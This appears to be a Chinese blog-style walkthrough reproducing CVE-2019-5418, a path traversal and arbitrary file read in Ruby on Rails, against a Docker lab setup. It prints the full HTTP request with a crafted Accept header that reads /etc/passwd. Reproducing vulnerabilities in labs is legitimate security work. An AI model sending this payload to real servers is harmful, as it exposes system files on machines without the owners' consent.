> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/S7GaIAVLBkT8eX2_S1x0TA)

![](https://mmbiz.qpic.cn/mmbiz_gif/3xxicXNlTXLicwgPqvK8QgwnCr09iaSllrsXJLMkThiaHibEntZKkJiaicEd4ibWQxyn3gtAWbyGqtHVb0qqsHFC9jW3oQ/640?wx_fmt=gif) 

**Ruby on Rails 路径穿越与任意文件读取漏洞（CVE-2019-5418）**

在控制器中通过 `render file` 形式来渲染应用之外的视图，且会根据用户传入的 Accept 头来确定文件具体位置。

我们通过传入

`Accept: ../../../../../../../../etc/passwd{{` 头来构成构造路径穿越漏洞，读取任意文件。

  
**参考链接：**  
- https://groups.google.com/forum/ ... ecurity/pFRKI96Sm8Q  
- https://xz.aliyun.com/t/4448

**环境搭建**  
执行如下命令编译及启动

Rail On Rails 5.2.2：docker-compose build/docker-compose up -d

 ![](https://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLibPc08bfpKXBZyvPZbnHibOCt1PkxvpZwgybg2pNDYmTfQOcHvWibnBq87ectgxjSiaPySLa24fJjUYg/640?wx_fmt=png)   

环境启动后，访问 `http://your-ip:3000` 即可看到 Ruby on Rails 的欢迎页面。

 ![](https://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLibPc08bfpKXBZyvPZbnHibOCdxsT9WOFq6HibqZ0oDBVicSQXY0raLfffvzic7L6DLsjzJq3DqfESPMvg/640?wx_fmt=png) 

**漏洞复现**  
访问 `http://your-ip:3000/robots` 可见，正常的 robots.txt 文件被读取出来。

  
 ![](https://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLibPc08bfpKXBZyvPZbnHibOCmgpUoy7pD3jkWbNjEHibNIARRnXID70EJZfNJQA2PrIynib40xEib7bcQ/640?wx_fmt=png)   

利用漏洞，发送如下数据包，读取 `/etc/passwd`：  
```  
GET /robots HTTP/1.1  
Host: your-ip:3000  
Accept-Encoding: gzip, deflate  
Accept: ../../../../../../../../etc/passwd{{  
Accept-Language: en  
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)  
Connection: close  
```  
成功读取：

![](https://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLibPc08bfpKXBZyvPZbnHibOCibdoIHUekemknILyibaf85d1HtsuVaibSAeJj0GPICrvWYwR5zCGVxXeQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/3xxicXNlTXLicjiasf4mjVyxw4RbQt9odm9nxs9434icI9TG8AXHjS3Btc6nTWgSPGkvvXMb7jzFUTbWP7TKu6EJ6g/640?wx_fmt=jpeg)

推荐文章 ++++

![](https://mmbiz.qpic.cn/mmbiz_jpg/US10Gcd0tQFGib3mCxJr4oMx1yp1ExzTETemWvK6Zkd7tVl23CVBppz63sRECqYNkQsonScb65VaG9yU2YJibxNA/640?wx_fmt=jpeg)

*[CVE-2019-11043 PHP 远程代码执行](http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650496935&idx=4&sn=4488fdba40fedf0b8aec93f7e603a5ed&chksm=83ba3a43b4cdb3556d0df15556c34b706ce2aa63685a0915cabd1a2d283c0f8292953cabc489&scene=21#wechat_redirect)  

*[Apache Unomi 远程表达式代码执行（CVE-2020-13942）漏洞复现](http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650496854&idx=3&sn=cfab1fa1361e59ef33e869eb63d5d8f7&chksm=83ba3ab2b4cdb3a415463e08b5078e2a3a4db5718d1f5179670878a1ef6edb586eca822e1ed3&scene=21#wechat_redirect)

*[Webmin 远程命令执行（CVE-2019-15107）漏洞利用](http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650491765&idx=4&sn=b26aaffa37cce299469b16cde933e216&chksm=83ba2e91b4cda7879bb7577294dbe08b853d85ee6879eb529a0e3a58ef04f8f424d3f4cd3a1b&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLib0FWIDRa9Kwh52ibXkf9AAkntMYBpLvaibEiaVibzNO1jiaVV7eSibPuMU3mZfCK8fWz6LicAAzHOM8bZUw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_gif/NZycfjXibQzlug4f7dWSUNbmSAia9VeEY0umcbm5fPmqdHj2d12xlsic4wefHeHYJsxjlaMSJKHAJxHnr1S24t5DQ/640?wx_fmt=gif)